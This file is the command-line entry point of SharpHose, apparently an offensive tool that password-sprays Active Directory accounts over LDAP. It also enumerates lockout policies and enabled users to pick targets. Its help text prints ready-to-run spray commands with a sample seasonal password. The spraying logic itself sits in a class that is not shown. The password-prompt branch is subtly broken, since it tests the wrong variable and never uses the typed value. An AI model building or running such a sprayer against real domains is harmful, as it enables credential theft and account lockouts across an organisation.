using CommandLine;
using CommandLine.Text;
using SharpHose.Common.Enums;
using SharpHose.Common.Helpers;
using SharpHose.Common.Objects;
using SharpHose.Nozzles.LDAP;
using System;
using System.Collections.Generic;
using System.Diagnostics;

namespace SharpHose
{
    class Program
    {
        static void Main(string[] args)
        {
            var parser = new Parser(config =>
            {
                config.HelpWriter = null;
                config.CaseInsensitiveEnumValues = true;
            });

            var parserResult = parser.ParseArguments<CLIOptions>(args);

            parserResult
              .WithParsed<CLIOptions>(options => Run(options))
              .WithNotParsed(errs => DisplayHelp(parserResult, errs));
        }

        static void DisplayHelp<T>(ParserResult<T> result, IEnumerable<Error> errs)
        {
            var helpText = HelpText.AutoBuild(result, h =>
            {
                h.AdditionalNewLineAfterOption = true;
                h.Heading = $"SharpHose v{System.Reflection.Assembly.GetEntryAssembly().GetName().Version.Major}";
                h.Copyright = string.Empty;
                h.AddEnumValuesToHelpText = true;
                return h;
            }, e => e);

            Console.WriteLine(helpText);

            foreach (var error in errs)
            {
                switch (error.Tag)
                {
                    case ErrorType.MissingRequiredOptionError:
                        var requiredError = (MissingRequiredOptionError)error;
                        Console.WriteLine($"Error missing argument: {requiredError.NameInfo.NameText}");
                        break;
                    case ErrorType.MissingValueOptionError:
                        var valueError = (MissingValueOptionError)error;
                        Console.WriteLine($"Error missing required value: {valueError.NameInfo.NameText}");
                        break;
                }
            }

            var name = Process.GetCurrentProcess().MainModule.ModuleName;
            var usage = "\nExamples:\n";
            usage += $"Domain Joined Spray: {name} --action SPRAY_USERS --spraypassword Spring2020! --output c:\\temp\\\n";
            usage += $"Domain Joined Spray w/ Exclusions: {name} --action SPRAY_USERS --spraypassword Spring2020! --output c:\\shared\\ --exclude c:\\temp\\exclusion_list.txt\n";
            usage += $"Non-Domain Joined Spray: {name} --action SPRAY_USERS --spraypassword Spring2020! --domain lab.local --username demo --password DemoThePlanet --output c:\\temp\\\n";
            usage += $"Domain Joined Show Policies: {name} --action GET_POLICIES --output c:\\temp\\\n";
            usage += $"Domain Joined Show Policy Users: {name} --action GET_POLICY_USERS --policy lab --output c:\\temp\\\n";
            usage += $"Domain Joined Show All Users: {name} --action GET_ENABLED_USERS --output c:\\temp\\\n";
            Console.Write(usage);
        }

        static void Run(CLIOptions opts)
        {
            if (opts.SprayPassword == null && opts.Action == LDAPAction.SPRAY_USERS)
            {
                Console.WriteLine("Please supply a password to spray: ");
                var response = Console.ReadLine();

                if (opts.SprayPassword != null)
                {
                    opts.SprayPassword = response;
                }
                else
                {
                    Console.WriteLine($"Missing --spraypassword argument.");
                    return;
                }
            }

            if ((string.IsNullOrEmpty(opts.PolicyName)) && (opts.Action == LDAPAction.GET_POLICY_USERS))
            {
                Console.WriteLine("Please supply a policy name: ");
                var response = Console.ReadLine();

                if (!string.IsNullOrEmpty(response))
                {
                    opts.PolicyName = response;
                }
                else
                {
                    Console.WriteLine($"Missing --policy argument.");
                    return;
                }
            }

            if((string.IsNullOrEmpty(opts.OutputPath)) && (opts.Quiet))
            {
                Console.WriteLine("Missing --output argument while supplying --quiet, please supply an output directory: ");
                var response = Console.ReadLine();

                if (!string.IsNullOrEmpty(response))
                {
                    opts.OutputPath = response;
                }
                else
                {
                    Console.WriteLine($"Missing --output argument while using --quiet.");
                    return;
                }
            }

            var config = new LDAPConfig()
            {
                DomainName = opts.DomainName,
                DomainController = opts.DomainController,
                DomainUsername = opts.DomainUsername,
                DomainPassword = opts.DomainPassword,
                SprayPassword = opts.SprayPassword,
                Auto = opts.Auto,
                OutputPath = opts.OutputPath,
                ExcludeFilePath = opts.ExcludeFilePath,
                SaveOutput = !string.IsNullOrEmpty(opts.OutputPath),
                ExcludeUsers = !string.IsNullOrEmpty(opts.ExcludeFilePath),
                Logger = new ConsoleLogger(opts.Quiet)
            };

            switch (opts.Nozzle)
            {
                case NozzleType.LDAP:
                    var ldapNozzle = new LDAPNozzle(config);

                    switch(opts.Action)
                    {
                        case LDAPAction.GET_POLICIES:
                            ldapNozzle.DisplayPolicies();
                            break;
                        case LDAPAction.GET_POLICY_USERS:
                            ldapNozzle.DisplayPolicyUsers(opts.PolicyName, false);
                            break;
                        case LDAPAction.GET_ENABLED_USERS:
                            ldapNozzle.DisplayEnabledUsers();
                            break;
                        case LDAPAction.SPRAY_USERS:
                            ldapNozzle.Start();
                            break;
                    }
                    break;
            }
        }
    }
}
